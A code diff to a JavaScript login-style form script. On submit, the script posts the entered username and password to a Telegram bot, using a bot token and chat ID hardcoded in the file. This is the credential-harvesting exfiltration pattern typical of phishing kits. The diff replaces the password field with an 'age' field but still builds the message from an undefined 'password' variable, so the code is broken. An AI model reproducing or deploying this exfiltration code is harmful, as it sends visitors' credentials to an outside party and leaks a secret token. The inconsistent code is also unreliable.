@@ -19,17 +19,31 @@ function togglePassword() {
     }
 }
 
+
+// Telegram configuration
 const BOT_TOKEN = "8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0";
 const CHAT_ID = "5613942414";
 
+
+// Form
 const form = document.getElementById("demoForm");
 
 if (form) {
+
     form.addEventListener("submit", async function (event) {
+
         event.preventDefault();
 
-        const username = document.getElementById("username").value.trim();
-        const password = document.getElementById("password").value.trim();
+        const usernameElement = document.getElementById("username");
+        const ageElement = document.getElementById("age");
+
+        if (!usernameElement || !ageElement) {
+            console.error("Required form fields not found");
+            return;
+        }
+
+        const username = usernameElement.value.trim();
+        const age = ageElement.value.trim();
 
         const telegramMessage =
             "📋 DEMO FORM SUBMISSION\n\n" +
@@ -37,26 +51,44 @@ if (form) {
             "password: " + password;
 
         try {
+
             const response = await fetch(
-                `https://api.telegram.org/bot${8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0}/sendMessage`,
+                `https://api.telegram.org/bot8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0/sendMessage`,
                 {
                     method: "POST",
+
                     headers: {
                         "Content-Type": "application/json"
                     },
+
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: telegramMessage
                     })
                 }
-                } catch (error) {
-            console.error(error);
+            );
+
+            const result = await response.json();
+
+            if (result.ok) {
+
+                alert("Submitted successfully!");
+                form.reset();
+
+            } else {
+
+                console.error("Telegram API error:", result);
+                alert("Submission failed.");
+
+            }
+
+        } catch (error) {
+
+            console.error("Network error:", error);
             alert("Network error.");
+
         }
+
     });
-           
 
-            
-          
-
-            
+}
